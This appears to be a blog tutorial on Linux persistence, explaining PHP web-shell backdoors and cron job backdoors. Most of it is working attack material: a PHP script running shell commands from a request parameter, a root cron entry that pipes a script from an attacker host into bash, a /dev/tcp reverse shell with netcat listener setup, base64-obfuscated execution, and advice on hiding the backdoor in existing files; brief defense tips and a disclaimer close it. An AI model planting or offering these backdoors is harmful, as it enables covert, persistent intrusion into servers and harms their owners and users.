---
title : "Linux Backdoors Part-II"
date : 2025-08-16 
layout : post
categories : [BACKDOOR]
tags : [PHP,CRONJOB,BACKDOOR]
author : jana
---

# PHP and Cron Job Backdoors: Gaining Persistent Access Like a Pro

In this post, we’ll dive into two powerful techniques attackers use to maintain access to a compromised Linux server: **PHP backdoors** and **cron job backdoors**. These methods are often used in **post-exploitation** scenarios to establish **persistence**. Let's break them down clearly, like a mentor would.

---

## 🔍 What Is a Backdoor?

A **backdoor** is a hidden way to regain access to a system after the initial exploit. Once an attacker gains access (especially root access), they may leave a small script or schedule a task to reconnect to them — so even if you reboot the server or patch the vulnerability, they can come back in.

---

## 🐘 PHP Backdoors

A **PHP backdoor** is a small PHP script that allows an attacker to execute system commands via a web browser.

### ✅ Example Code:

```php
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

## 🔧 How It Works:

- This script checks for a cmd parameter in the request.

- It uses **shell_exec()** to run any system command sent via the browser.

- Output is displayed in **<pre>** tags for readability.

## 🌐 Usage:

- If the file is saved as shell.php in  `/var/www/html` , an attacker can do:

```bash
http://<target-ip>/shell.php?cmd=whoami
```
## Other useful examples:

- `ls` – list files

- `cat /etc/passwd` – read sensitive files

- `nc` – establish reverse shells

## 🕵️ How Attackers Hide It:

- Inject the backdoor into an existing file like index.php.

- Change cmd to a less suspicious name (e.g., x1 or auth_key).

- Store the file in an obscure folder (e.g., /var/www/html/img/).

## ⏰ Cron Job Backdoors

- A cron job is a scheduled task. Attackers can schedule a reverse shell to run every minute, ensuring they maintain access.

## ✅ Example Cron Entry:

```
* * * * * root curl http://<attacker-ip>:8080/shell | bash
```
### This does the following:

Runs every minute (* * * * *)

As the root user

Downloads a script from the attacker's server using curl

Pipes it into bash for execution

## 🔥 Shell Script Example:

- On the attacker’s server (hosted at port 8080), the shell file contains:

```bash
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
```
## 🛠️ Setup:

Host the shell:

```bash
python3 -m http.server 8080
```

- Start listening for a connection:

```bash
nc -nvlp <port>
```
- Wait for the cron to trigger.

## ⚠️ Why It's Risky:

- Visible in /etc/crontab

- Easily detected by sysadmins

- Logs may show repeated traffic to external IPs

## 🕶️ Making It Sneakier

Attackers may:

- Use user-level crontabs via `crontab -e` instead of global `/etc/crontab`

- Base64-encode the reverse shell to avoid detection:

```bash
echo "<encoded_script>" | base64 -d | bash
```

- Name scripts something innocuous like  `/update-check` or `/sys-patch`

## 🧠 Final Thoughts
- Both PHP and cron job backdoors are powerful tools in an attacker's toolkit. As an ethical hacker or security professional, understanding how these work is essential — both for offensive use (in labs/CTFs) and for detecting/removing them during incident response.

## 🛡️ Tips for Defense:

- Monitor for unexpected PHP files or parameters in web root.

- Regularly audit /etc/crontab and user crontabs.

- Monitor outbound connections from critical servers.

- Use tools like auditd, chkrootkit, or rkhunter.

### ⚠️ Disclaimer: This post is for educational and ethical hacking purposes only. Always have permission before testing any technique on a live system.
